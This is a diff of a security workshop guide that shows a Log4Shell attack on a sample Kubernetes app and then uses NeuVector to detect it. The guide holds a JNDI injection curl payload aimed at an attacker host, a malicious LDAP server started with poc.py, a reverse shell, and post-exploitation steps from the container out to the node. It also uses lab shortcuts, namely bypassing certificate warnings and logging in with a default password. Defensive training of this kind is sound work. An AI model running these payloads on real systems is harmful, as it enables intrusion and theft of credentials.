@@ -5,6 +5,7 @@
 ```
 cd /tmp/yaml
 ```
+
 3. apply the the needed yaml files to deploy the sample application and the ingress to access it.
 ```
 kubectl apply -f /tmp/yaml/sample_app_deployment.yml
@@ -13,16 +14,59 @@ kubectl apply -f /tmp/yaml/sample_app_deployment.yml
 ```
 kubectl apply -f /tmp/yaml/sample_app_service_ingress.yml
 ```
+
 4. Access the application via Browser. You can get the URL from the ingress yaml file.
 ```
 cat /tmp/yaml/sample_app_service_ingress.yml
 ```
-5. Create digital ocean token.
+
+5. Copy the URL into your Browser and take a look. 
+6. Create digital ocean token.
 ```
 kubectl apply -f /tmp/yaml/digital_ocean_token.yml
 ```
 
-# Step 2 - Installing NeuVector
+# Step 2 - Install cert-manager
+
+cert-manager is a Kubernetes add-on to automate the management and issuance of TLS certificates from various issuing sources.
+
+The following set of steps will install cert-manager which will be used to manage the TLS certificates for NeuVector.
+
+## Run the following commands on the victim VM.
+
+First, we'll add the helm repository for Jetstack
+
+```
+helm repo add jetstack https://charts.jetstack.io
+```
+
+Now, we can install cert-manager:
+
+```
+helm install cert-manager jetstack/cert-manager \
+  --namespace cert-manager \
+  --version v1.11.0 \
+  --set installCRDs=true \
+  --create-namespace
+```
+
+Once the helm chart has installed, you can monitor the rollout status of both `cert-manager` and `cert-manager-webhook`
+
+```
+kubectl -n cert-manager rollout status deploy/cert-manager
+```
+
+You should eventually receive output similar to:
+
+`Waiting for deployment "cert-manager" rollout to finish: 0 of 1 updated replicas are available...`
+
+`deployment "cert-manager" successfully rolled out`
+
+```
+kubectl -n cert-manager rollout status deploy/cert-manager-webhook
+```
+
+# Step 3 - Installing NeuVector
 ```
 helm repo add neuvector https://neuvector.github.io/neuvector-helm/
 ```
@@ -41,9 +85,8 @@ helm install neuvector neuvector/core \
   --create-namespace
 ```
 
-
-# Step 3 - Prepare the Attack
-Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**. We will use python3 and  socat which are already installed on the attacker machine. Login into the attacker machine with username and password via SSH. 
+# Step 4 - Prepare the Attack
+Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**. Login into the attacker machine with username and password via SSH. 
 
 1. Change the promt to identify the shell.
 
@@ -52,9 +95,11 @@ export VM=attacker
 PS1="\u@$VM:\w>"
 ```
 
-2. Then we need to set the variable for the public IP address
+2. Then we need to set the variable for the public IP address. There is also a file called puplic-ip which is stored in the /tmp folder.
 
-```export PUBLIC_IP=<public ip address>```
+```
+export PUBLIC_IP=<public ip address>
+```
 
 3. Install needed packages and download the app
 ```
@@ -78,7 +123,6 @@ mv java-se-8u43-ri/ jdk1.8.0_20
 ```
 
 4. Now we can run the python app that provides the exploit
-
 ```
 sudo python3 poc.py --userip ${PUBLIC_IP} --webport 80 --lport 443 &
 ```
@@ -107,7 +151,6 @@ Now let's start the attack. The following HTTP request triggers a log4shell vuln
 Because of that log4j will connect to the attacker's LDAP server, which will provide a Java class that gets executed by the sample app and create a remote shell from the container to the attacker's netcat session:
 
 ## Run the following commands on the victim VM
-
 ```
 curl http://sample-app.default.${PUBLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKER_PUBLIC_IP}:1389/a}'
 ```
@@ -117,11 +160,15 @@ The first shell on the **attacker VM** now received a remote shell from the cont
 
 We can list the container filesystem
 
-```ls -la```
+```
+ls -la
+```
 
 or the running processes
 
-```ps auxf```
+```
+ps auxf
+```
 
 Let's try to install kubectl into the container
 
@@ -131,11 +178,15 @@ curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://d
 
 And access the Kubernetes API. This should create an error, because the Pod's ServiceAccount does not have any permissions to access the Kubernetes API:
 
-```kubectl get pods```
+```
+kubectl get pods
+```
 
 Let's try something else and list the Linux capabilities of the container
 
-```capsh --print```
+```
+capsh --print
+```
 
 Not that our container does not have `cap_sys_admin` capabilities.
 
@@ -197,7 +248,9 @@ docker ps
 
 Install kubectl
 
-```docker cp kubelet:/usr/local/bin/kubectl /usr/bin/```
+```
+docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
+```
 
 Get kubeconfig
 
@@ -236,47 +289,7 @@ doctl auth init -t $do_token
 
 # Break until everyone finished these steps
 
-# Step 5 - Install cert-manager
-
-cert-manager is a Kubernetes add-on to automate the management and issuance of TLS certificates from various issuing sources.
-
-The following set of steps will install cert-manager which will be used to manage the TLS certificates for NeuVector.
-
-## Run the following commands on the victim VM.
-
-First, we'll add the helm repository for Jetstack
-
-```
-helm repo add jetstack https://charts.jetstack.io
-```
-
-Now, we can install cert-manager:
-
-```
-helm install cert-manager jetstack/cert-manager \
-  --namespace cert-manager \
-  --version v1.11.0 \
-  --set installCRDs=true \
-  --create-namespace
-```
-
-Once the helm chart has installed, you can monitor the rollout status of both `cert-manager` and `cert-manager-webhook`
-
-```
-kubectl -n cert-manager rollout status deploy/cert-manager
-```
-
-You should eventually receive output similar to:
-
-`Waiting for deployment "cert-manager" rollout to finish: 0 of 1 updated replicas are available...`
-
-`deployment "cert-manager" successfully rolled out`
-
-```
-kubectl -n cert-manager rollout status deploy/cert-manager-webhook
-```
-
-# Step 6 - Accessing NeuVector
+# Step 5 - Accessing NeuVector
 
 ***Note:*** NeuVector may not immediately be available at the link below, as it may be starting up still. Please continue to refresh until NeuVector is available.
 
@@ -286,17 +299,14 @@ First wait until all NeuVector Pods are up and running
 
 ```kubectl get pods -n cattle-neuvector-system```
 
-1. Access NeuVector at https://neuvector.cattle-neuvector-system.${PUBLIC_IP}.sslip.io).
+1. Access NeuVector at https://neuvector.cattle-neuvector-system.${PUBLIC_IP}.sslip.io.
 2. For this Workshop, NeuVector is installed with a self-signed certificate from a CA that is not automatically trusted by your browser. Because of this, you will see a certificate warning in your browser. You can safely skip this warning. Some Chromium based browsers may not show a skip button. If this is the case, just click anywhere on the error page and type "thisisunsafe" (without quotes). This will force the browser to bypass the warning and accept the certificate.
 3. Log in with the username "admin" and the default password "admin"
 4. Make sure to agree to the Terms & Conditions
 
-
-
-
-# Step 7 Showing NeuVector
-## Showing Vulnerabilities
-### Show log4shell vulnerability and compliance
+# Step 6 Looking deeper into NeuVector
+## Looking for Vulnerabilities
+### look at log4shell vulnerability and compliance
 1. Highlight the poor status of the node
 2. Go to **Security Risks** -> **Vulnerabilities**
 3. Filter for **CVE-2021-45046**
